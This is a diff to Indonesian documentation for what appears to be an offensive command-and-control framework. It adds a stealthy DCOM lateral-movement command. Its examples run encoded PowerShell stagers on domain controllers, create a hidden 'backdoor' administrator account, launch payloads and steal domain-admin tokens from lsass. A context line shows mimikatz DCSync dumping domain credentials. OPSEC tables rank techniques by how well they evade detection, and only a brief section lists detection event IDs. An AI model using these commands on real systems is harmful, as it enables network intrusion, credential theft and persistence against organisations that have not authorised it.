@@ -23,12 +23,70 @@ yang perlu di-drop ke disk.
 
 ## Teknik yang Tersedia
 
-| Command | Metode | Tool | Output | Butuh Admin |
-|---------|--------|------|--------|-------------|
-| `lateral wmi` | WMI process spawn | `wmic.exe` | Fire-and-forget | Ya |
-| `lateral winrm` | PSRemoting | `powershell.exe` | Captured | Ya (+ WinRM enabled) |
-| `lateral schtask` | Remote schtask | `schtasks.exe` | Fire-and-forget | Ya |
-| `lateral service` | Remote service | `sc.exe` | Fire-and-forget | Ya |
+| Command | Metode | Tool | Output | Butuh Admin | Noise |
+|---------|--------|------|--------|-------------|-------|
+| `lateral dcom` | DCOM COM activation | `powershell.exe` | Fire-and-forget | Ya | ⭐ Paling stealth |
+| `lateral wmi` | WMI process spawn | `wmic.exe` | Fire-and-forget | Ya | Rendah |
+| `lateral winrm` | PSRemoting | `powershell.exe` | Captured | Ya (+ WinRM enabled) | Rendah |
+| `lateral schtask` | Remote schtask | `schtasks.exe` | Fire-and-forget | Ya | Sedang |
+| `lateral service` | Remote service | `sc.exe` | Fire-and-forget | Ya | Tinggi |
+
+---
+
+## lateral dcom ⭐ (paling stealth)
+
+Mengaktifkan COM object di remote host melalui **DCOM/RPC** dan memanggil method yang
+men-spawn process. Tidak ada service, schtask, atau named pipe — artefak paling minimal
+dari semua teknik lateral movement.
+
+Tiga COM class yang didukung:
+
+| Method | COM Class | CLSID | Syarat |
+|--------|-----------|-------|--------|
+| `mmc20` (default) | MMC20.Application | `{49B2791A-...}` | Tidak ada (paling kompatibel) |
+| `shellwindows` | ShellWindows | `{9BA05972-...}` | Butuh desktop session aktif di target |
+| `shellbrowser` | ShellBrowserWindow | `{C08AFD90-...}` | Alternatif jika shellwindows gagal |
+
+**Catatan OPSEC:** DCOM tidak support explicit credential — agent harus sudah hold token DA.
+Gunakan `token steal` atau `token make` terlebih dahulu.
+
+```
+lateral dcom <agent-id> <rhost> <command> [--method mmc20|shellwindows|shellbrowser] [--wait]
+```
+
+### Contoh
+
+```bash
+# Default (mmc20) — paling reliable
+lateral dcom 7d019eb7 DC01 "powershell -enc <B64_STAGER>" --wait
+
+# Dengan method eksplisit
+lateral dcom 7d019eb7 192.168.1.100 \
+  "cmd /c net user backdoor P@ss /add && net localgroup administrators backdoor /add" \
+  --method mmc20 --wait
+
+# ShellWindows — kalau mmc20 gagal (butuh user login di target)
+lateral dcom 7d019eb7 FS01 "C:\Windows\Temp\payload.exe" --method shellwindows --wait
+
+# Workflow lengkap: steal DA token dulu, lalu DCOM
+token steal 7d019eb7 --pid 624 --wait          # PID = lsass atau winlogon DA session
+lateral dcom 7d019eb7 DC01 "powershell -enc <B64>" --wait
+```
+
+**Output:**
+```
+[+] DCOM/mmc20 → DC01  (cmd 9f3a...)
+    [i] Waiting for result (timeout 60s)...
+    [+] Command completed:
+    [+] DCOM mmc20 → DC01: command dispatched
+```
+
+### Deteksi dan Mitigasi (Blue Team Perspective)
+
+- **Event 4624** — Network logon ke target (type 3)
+- **Event 4688** — Process creation dengan parent `svchost.exe` atau `mmc.exe`
+- Tidak ada Event 7045 (service install) atau 4698 (schtask create)
+- Deteksi melalui DCOM-specific: `Microsoft-Windows-DistributedCOM` Event 10028
 
 ---
 
@@ -203,18 +261,20 @@ cmd 4f1b8e23 "C:\Windows\Temp\mimikatz.exe \"lsadump::dcsync /domain:CORP /all\"
 
 ## OPSEC Notes
 
-| Teknik | Visibility | Artefact | Deteksi |
-|--------|-----------|----------|---------|
-| WMI | Event 4688 (remote process) | Tidak ada | WMI abuse signatures |
-| WinRM | Event 4688 + PS script block | Tidak ada | PSRemoting logging |
-| Schtask | Event 4698 (task created) | Task XML (tapi dihapus) | Schtask remote creation |
-| Service | Event 7045 (service install) | SCM entry (dihapus) | PsExec-like detection |
+| Teknik | Event ID | Artefact | Deteksi | Stealth |
+|--------|----------|----------|---------|---------|
+| **DCOM** | 4624, 4688 | Tidak ada | DCOM-specific log | ⭐⭐⭐⭐ |
+| WMI | 4688 (remote) | Tidak ada | WMI abuse signatures | ⭐⭐⭐ |
+| WinRM | 4688 + PS blocks | Tidak ada | PSRemoting logging | ⭐⭐⭐ |
+| Schtask | 4698 (task create) | XML (dihapus) | Remote schtask | ⭐⭐ |
+| Service | 7045 (install) | SCM entry (dihapus) | PsExec-like | ⭐ |
 
 **Rekomendasi urutan stealth:**
-1. WinRM (output-nya rapih, event ID sama dengan normal admin)
-2. WMI (fire-and-forget, event 4688 sering ada)
-3. Schtask (event 4698 spesifik, tapi tool bawaan)
-4. Service (paling noisy — AV sering alert)
+1. **DCOM** — tidak ada service/schtask, hanya network logon + process spawn
+2. WMI — fire-and-forget, event 4688 umum ada di Windows
+3. WinRM — output di-capture tapi PSRemoting bisa di-log lebih detail
+4. Schtask — event 4698 lebih spesifik
+5. Service — paling noisy, AV sering alert pada pattern ini
 
 ---
 
